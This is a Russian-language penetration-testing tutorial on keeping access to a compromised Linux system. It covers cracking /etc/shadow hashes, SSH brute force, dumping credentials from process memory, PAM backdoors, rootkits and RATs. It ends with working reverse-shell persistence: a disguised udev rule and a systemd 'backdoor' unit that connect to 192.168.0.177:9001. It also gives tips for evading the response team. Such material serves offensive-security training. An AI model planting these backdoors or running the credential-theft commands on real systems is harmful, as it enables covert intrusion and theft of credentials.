### Получение легитимного доступа к системе

Данная категория раскрывает методы закрепления доступа, позволяющие закреплять доступ к системе, не внося в систему
изменения, используя существующие учетные данные и способы доступа к системе.

Плюсы подхода:

- Наименее заметный для команды реагирования подход к закреплению доступа, т.к. в систему не вносится никаких изменений,
  которые можно было бы заметить.
- Такой подход может предоставлять доступ достаточно долго, если инцидент с компрометацией системы не был обнаружен.

Минусы подхода:

- Если инцидент компрометации стал известен, то самой очевидной из практик защиты становится изменения паролей и ключей
  доступа к системе, что несет собой потерю доступа к системе для пентестера.
- Такой подход не работает лучше при использовании совмещения его с другими подходами, т.к. если мы используем
  инвазивные
  методы закрепления, в случаи их обнаружения мы потеряем и данный способ закрепления.
- Учетные данные могут быть изменены и без обнаружения факта компрометации системы по воле оператора, обслуживающего
  систему.

Получение легитимного доступа к системе может быть достигнуто следующими практиками:

- Извлечение паролей и ключей из доступных файлов в ОС
- Восстановление паролей из хешей
- Подбор паролей методом перебора
- Восстановление паролей и ключей из памяти процессов

#### Извлечение паролей и ключей из доступных файлов в ОС

Для поиска паролей и пр. секретов в файловой системе ОС можно использовать скрипты энумерации: LinPeas, WinPeas и пр.
Подробнее познакомимся с ними позже.

#### Восстановление паролей из хешей

Для восстановления паролей из хешированных значений пригодятся такие инструменты, как JohnTheRipper.

**John the Ripper** — это инструмент для восстановления паролей, который может использоваться для анализа файлов паролей
и
попытки восстановления паролей. Для использования John the Ripper для анализа файлов паролей вам нужно выполнить
следующие команды:

    $ sudo cp /etc/shadow /tmp/shadow
    $ sudo unshadow /etc/passwd /tmp/shadow > /tmp/unshadowed
    $ john /tmp/unshadowed

В случае, если вы обнаружили прочие хеши паролей от других сервисов в ОС, можно воспользоваться более универсальной
утилитой Hashcat.

**Hashcat** — это инструмент для взлома паролей, который может использоваться для анализа хешей паролей и попыток их
взлома.

Hashcat поддерживает множество различных алгоритмов хеширования, таких как MD5, SHA1, SHA256, bcrypt и многие другие.
Вот пример команды для запуска hashcat для взлома хешей MD5:

    hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

где

    -m 0 означает, что мы используем алгоритм хеширования MD5
    -a 0 означает, что мы используем атаку перебора
    hash.txt — это файл с хешами паролей, которые мы пытаемся взломать
    /usr/share/wordlists/rockyou.txt — это словарь, который мы используем для перебора паролей.

Это только один пример использования hashcat. Для каждого алгоритма хеширования и типа атаки существуют различные
параметры и настройки, которые могут быть использованы в hashcat.

Существуют и другие подходы к взлому хеша. Отличаются зачастую только подходом верификации пароля (локально/удалённо и
пост/пре-хешировании)

Для ускорения атаки могут использоваться радужные таблицы. Подробнее тут.

**Радужная таблица** — специальный вариант таблиц поиска для обращения криптографических хеш-функций, использующий
механизм
разумного компромисса между временем поиска по таблице и занимаемой памятью.

Предварительно вычисляются радужные таблицы, которые затем используются для быстрого нахождения паролей, соответствующих
хэшам.

Также существует атака «дней рождения». Этот тип атаки связан с нахождением коллизий в хэш-функциях. Подробнее тут.

Подобрать пароль по хешу можно и с помощью онлайн-сервисов. Подробнее

#### Подбор паролей методом перебора

На этом этапе могут быть использованы уже известные нам утилиты для атак методом перебора.

Минус такого подхода в качестве инструмента для закрепления доступа в том, что мы должны предустановить инструмент на
машину для обеспечения большей скорости обращений, что с высокой долей вероятности будет заметно командой реагирования и
отразится в журналах аудита.

Тем не менее такими инструментами могут послужить nmap, patator или hydra, а также прочие менее известные скрипты для
атак методом перебора. Использовать такие инструменты лучше в виде портативных файлов для вашей версии ОС, чтобы не
устанавливать их через стандартные механизмы ОС.

Пример команды для запуска атаки методом перебора на SSH сервис утилиты patator:

```commandline
patator ssh_login host=192.168.0.1 user=admin password=FILE0 0=/путь/к/файлу_с_паролями.txt -x ignore:fgrep='Permission denied'
```

Пример команды для запуска атаки методом перебора на SSH-сервис утилиты nmap:

```commandline
nmap --script ssh-brute --script-args userdb=usernames.txt,passdb=passwords.txt <target>, где

--script ssh-brute – указывает использование скрипта для перебора паролей ssh.
--script-args userdb=usernames.txt,passdb=passwords.txt – указывает на файлы, содержащие список пользователей и паролей
соответственно.
<target> – целевой IP-адрес или диапазон адресов.
```

Скачать прекомпилированный бинарный файл nmap можно тут

### Восстановление паролей и ключей из памяти процессов

Восстановление паролей и ключей из памяти процессов в Linux реализовано не так разнообразно как в Windows, но тоже
остается возможным. Для этого используются специальные инструменты и подходы.

Пример:
**Mimipenguin** — это инструмент для перехвата паролей из памяти процессов, работающих на Linux-системе. Обычно он
используется для получения паролей, введенных пользователем в терминал, например, паролей от системы или приложений.
После запуска Mimipenguin начнет мониторить процессы в системе и попытается извлечь пароли из памяти процессов. Если он
найдет пароли — он отобразит их в терминале.

Другой пример:
**truffleproc** — это инструмент для перехвата паролей из памяти любых процессов работающих в системе Linux, который
ищет
пароли и ключи API в процессах по регулярным выражениям выполняя выгрузку памяти процесса и анализируя ее.

Ссылка на инструмент: https://github.com/controlplaneio/truffleproc

Вы можете сделать то же самое вручную, выбрав нужный процесс.

Если вы обнаружите, что процесс аутентификации запущен:

# ps -ef | grep "authenticator"

> root 2027 2025 0 11:46 ? 00:00:00 authenticator

Вы можете сделать дамп процесса (например, инструментом memory-dump) и поискать учетные данные в памяти:

# ./dump-memory.sh 2027

# strings *.dump | grep -i

Прочие подобные утилиты:

3snake – перехват паролей ssh, sudo и su (experimental)
SSHPry2.0 – перехват данных в терминале
Gimmecredz – дамп паролей в памяти (на основе bash)

### Внесение изменений в сервисы и внешние программы в ОС

Способы закрепления доступа через внесение изменений в сервисы и внешний программы подразумевают изменений
конфигурации или программного кода программ постоянно работающих в ОС и доступных для взаимодействия с пользователями
извне ОС.

Плюсы подхода:

- Достаточно скрытный метод закрепления доступа, т.к. логирование изменений в сервисах происходит на общем уровне
  внесения
  изменений в файловую систему, что может быть сложнее заметить команде реагирования.
- На доступность такого метода не влияет изменений учетных данных, прав доступа пользователей ОС.
- Заложенные backdoor’ы в программный код сервисов могут быть обнаружены только профессионалами, понимающими природу
  возникновения уязвимостей и умеющих отличить уязвимостей поведение от нормального.
- Также одним из способов закрепления может быть обнаружение прочих уязвимостей сервиса без внесения в него изменений.

Минусы подхода:

- В случае отката версии кода сервиса к последней стабильной, такой доступ может быть потерян. А это вероятно, если
  администратор сочтет поведение сервиса странным.
- Может быть замечен если в ОС стоит аудит внесения изменения в файловую систему и в особенности в файлы конфигурации.

Примеры:
Внедрение бэкдоров в сервисы ОС
Внедрение уязвимого поведения в сервисы ОС, для последующей эксплуатации уязвимостей
Запуск внешних программ для получения последующего контроля

### Внесение изменений в ядро ОС и в предустановленные службы на нем

Самые продвинутые и зачастую самые надежные подходы по закреплению доступа - это серия методов, позволяющих проникать
глубоко в ядро ОС и изменять стандартные службы удаленного доступа, аутентификации, обработки событий и пр.

Плюсы подхода:

- Некоторые из методов почти невозможно обнаружить при использовании стандартных средств анализа ОС, только используя
  глубокий анализ дампа памяти ОС. (Существуют методы, которые скрывают свое наличие при входе на сервер администратора
  и
  потом возвращают свое присутствие)
- Такие методы зачастую могут действовать даже после обновления ОС, и в частных случаях даже после переустановки ОС.
- Реализовать такой метод без действий, которые могут быть замечены в ходе выполнения, может быть не просто.

Минусы подхода:

- Высокая сложность реализации таких методов, а также сложность их отладки.
- Разница в версии ОС или дистрибутиве может быть критически важной для выбора метода закрепления из этой категории.
- Одним из самых популярных примеров внесения изменений в ядро ОС и закреплением на уровне ядра, может быть
  использование
  программ под общим названием RootKit.

**Rootkit** — это вид вредоносного программного обеспечения, которое скрывает свою присутствие на компьютере или другом
устройстве, изменяя функциональность операционной системы и скрывая свои следы от пользователей и системных программ.

Например:

**TripleCross** - это Linux eBPF-руткит с открытым исходным кодом, который демонстрирует наступательные возможности
технологии eBPF*.

* eBPF (Extended Berkeley Packet Filter) - это технология ядра Linux, которая позволяет расширять функциональность
  стандартного фильтра Berkeley Packet Filter (BPF) для обработки пакетов и мониторинга событий в ядре.
  Работа eBPF осуществляется через специальное виртуальное машинное окружение (VM), которое запускается внутри ядра
  Linux.Оно позволяет загружать и исполнять программы на языке C, которые могут обрабатывать пакеты на уровне ядра,
  принимать решения о пересылке или отбрасывании пакетов, создавать и мониторить события в ядре и многое другое.

Также для закрепления доступа используют ПО, именуемое Remote Admin Tool, что по своей сути очень похоже на RootKit, но
иногда не претендует на скрытность. Тем не менее, в этой категории также присутствуют заметные представители. В том
числе существуют легальные RAT-средства.

**Утилиты RAT (Remote Access Tool)** — это программные инструменты, которые позволяют удаленно управлять компьютером или
устройством без ведома пользователя. RAT-утилиты могут быть использованы для различных целей, в том числе для управления
компьютером из удаленного места, сбора конфиденциальной информации, мониторинга активности пользователя и т.д.

Например: https://github.com/n1nj4sec/pupy

### Внедрение бэкдоров модули аутентификации на основе PAM

**PAM (Pluggable Authentication Modules, подключаемые модули аутентификации)** — разделяемые библиотеки, используемые для
реализации произвольных методов аутентификации в виде единого API. Внедрение вредоносного модуля позволяет добавить
мастер-пароль и перехватить учетные данные.

Пример бэкдора: https://github.com/ociredefz/pambd/
#### Внедрение бэкдоров в драйверы
Для запуска бэкдора при подключении какого-либо устройства можно использовать каталог /etc/udev/rules.d/, в котором
хранятся правила для обработки событий устройств. Изменяя эти правила, можно переименовать устройство, настроить права
доступа к нему, но самое главное, что нас интересует — выполнить скрипт при подключении устройства.

  RSHELL="0<&196;exec 196<>/dev/tcp/192.168.0.177/9001; sh <&196 >&196 2>&196"
  echo "ACTION==\"add\",ENV{DEVTYPE}==\"usb_device\",SUBSYSTEM==\"usb\",RUN+=\"$RSHELL\"" | tee
  /etc/udev/rules.d/71-vbox-kernel-drivers.rules > /dev/null

В таком случае при подключении к машине USB-устройства порт выполнится скрипт RSHELL для предоставления доступа вашей
машине в сети.

#### Внедрение бекдоров в службы автозапуска (использование systemd)

**systemd** — это системный инициализатор и менеджер служб для операционных систем Linux. Он является заменой для более
старой системы инициализации SysVinit и предоставляет целый набор функциональных возможностей для управления и контроля
запуска служб и процессов в Linux-системе.

Systemd также имеет ряд дополнительных функций, включая событийную систему, журналирование и мониторинг процессов,
управление сетевыми интерфейсами и сетевыми соединениями, управление контейнерами и многие другие.

Чтобы создать свой бэкдор в системе systemd, достаточно описать свой собственный сервис:

    [Unit]
    Description=Backdoor
    After=network.target ssh.service
    
    [Service]
    Type=simple
    PIDFile=/var/run/backdoor.pid
    ExecStart=sh -i >& /dev/tcp/192.168.0.177/9001 0>&1"
    Restart=always
    RestartSec=10
    
    [Install]
    WantedBy=multi-user.target

Расположить его в файле:

    /lib/systemd/system/backdoor.service
Запустить его командами:

    sudo systemctl enable backdoor.service
    sudo systemctl start backdoor.service